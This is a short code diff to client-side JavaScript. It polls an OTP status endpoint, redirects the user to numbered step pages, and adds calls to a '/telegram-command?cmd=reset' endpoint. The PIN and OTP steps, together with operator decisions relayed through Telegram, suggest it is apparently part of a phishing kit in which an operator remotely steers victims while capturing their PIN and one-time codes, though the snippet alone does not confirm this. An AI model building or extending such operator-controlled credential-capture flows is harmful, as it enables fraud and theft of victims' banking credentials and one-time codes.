@@ -43,16 +43,22 @@ if (fromPin === "yes") {
         console.log("OTP STATUS:", data);
 
         if (String(data.otp) === "5") {
-            clearInterval(interval);
-            localStorage.removeItem("fromPin");
-            window.location.href = "step5.html";
-        }
+    clearInterval(interval);
+
+    fetch("/telegram-command?cmd=reset"); // optional
+
+    localStorage.removeItem("fromPin");
+    window.location.href = "step5.html";
+}
 
         if (String(data.otp) === "6") {
-            clearInterval(interval);
-            localStorage.removeItem("fromPin");
-            window.location.href = "step6.html";
-        }
+    clearInterval(interval);
+
+    fetch("/telegram-command?cmd=reset"); // ✅ reset AFTER use
+
+    localStorage.removeItem("fromPin");
+    window.location.href = "step6.html";
+}
 
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
